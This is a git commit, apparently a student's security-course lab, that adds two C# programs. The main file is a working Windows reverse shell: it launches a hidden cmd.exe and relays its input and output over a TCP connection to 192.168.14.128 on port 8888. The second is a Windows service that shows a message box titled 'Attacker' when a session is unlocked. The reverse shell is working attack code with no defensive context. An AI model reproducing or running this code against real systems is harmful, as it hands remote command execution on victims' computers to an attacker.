1b319f105e57029165c93c9e0f4ca8e9c9a9b42a
luckystars0612 <18520609@gm.uit.edu.vn>
2021-05-29 07:56:44 +0700

    source code lab 2

---
+++ Bai-3b(B.1.1)/reverse_shell/Program.cs
@@ -0,0 +1,103 @@
+﻿using System;
+using System.Diagnostics;
+using System.IO;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+
+namespace reverse_shell
+{
+    class Program
+    {
+        static StreamWriter str_writer;
+        static void Main(string[] args)
+        {
+            execute();
+        }
+        static public bool check_internet()
+        {
+            try
+            {
+                WebRequest request = HttpWebRequest.Create("https://google.com");
+                request.GetResponse();
+            }
+            catch(WebException ex)
+            {
+                return false;
+            }
+            return true;
+        }
+        static public void execute()
+        {
+            if(check_internet()==true)
+            {
+                create_reverse_shell();
+            }
+            else
+            {
+                create_folder(@"C:\Users\pexoa\OneDrive - Trường ĐH CNTT - University of Information Technology\Máy tính\Folder_new");
+            }
+        }
+        static public void create_reverse_shell()
+        {
+            using(TcpClient client= new TcpClient("192.168.14.128",8888))
+            {
+                using(Stream stream =client.GetStream())
+                {
+                    using(StreamReader str_reader=new StreamReader(stream))
+                    {
+                        str_writer = new StreamWriter(stream);
+                        StringBuilder str_input = new StringBuilder();
+                        Process p = new Process();
+                        p.StartInfo.FileName="cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            str_input.Append(str_reader.ReadLine());
+                            //strInput.Append("\n");
+                            p.StandardInput.WriteLine(str_input);
+                            str_input.Remove(0, str_input.Length);
+                        }
+                    }    
+                }    
+            }    
+        }
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    str_writer.WriteLine(strOutput);
+                    str_writer.Flush();
+                }
+                catch (Exception err) { }
+            }
+        }
+        static public void create_folder(string path)
+        {
+            try
+            {
+                if (!Directory.Exists(path))
+                {
+                    Directory.CreateDirectory(path);
+                }
+            }
+            catch(Exception ex)
+            {
+                Console.Write(ex.Message);
+            }
+        }
+    }
+}
---
+++ Bai-4(B.1.1)/service_login_popup/Service1.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace service_login_popup
+{
+    public partial class Service1 : ServiceBase
+    {   
+        public Service1()
+        {
+            InitializeComponent();
+            this.CanHandleSessionChangeEvent = true;
+        }
+        [DllImport("wtsapi32.dll", SetLastError = true)]
+        static extern bool WTSSendMessage(
+                 IntPtr hServer,
+                 [MarshalAs(UnmanagedType.I4)] int SessionId,
+                 String pTitle,
+                 [MarshalAs(UnmanagedType.U4)] int TitleLength,
+                 String pMessage,
+                 [MarshalAs(UnmanagedType.U4)] int MessageLength,
+                 [MarshalAs(UnmanagedType.U4)] int Style,
+                 [MarshalAs(UnmanagedType.U4)] int Timeout,
+                 [MarshalAs(UnmanagedType.U4)] out int pResponse,
+                 bool bWait);
+        protected override void OnSessionChange(SessionChangeDescription changeDescription)
+        {
+            if (changeDescription.Reason == SessionChangeReason.SessionUnlock)
+            {
+                bool result = false;
+                String title = "Attacker";
+                int tlen = title.Length;
+                String msg = "18520609";
+                int mlen = msg.Length;
+                int resp = 7;
+                var WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;
+                result = WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, changeDescription.SessionId, title, tlen, msg, mlen, 4, 3, out resp, true);
+            }
+        }
+        protected override void OnStart(string[] args)
+        {
+        }
+
+        protected override void OnStop()
+        {
+        }
+    }
+}
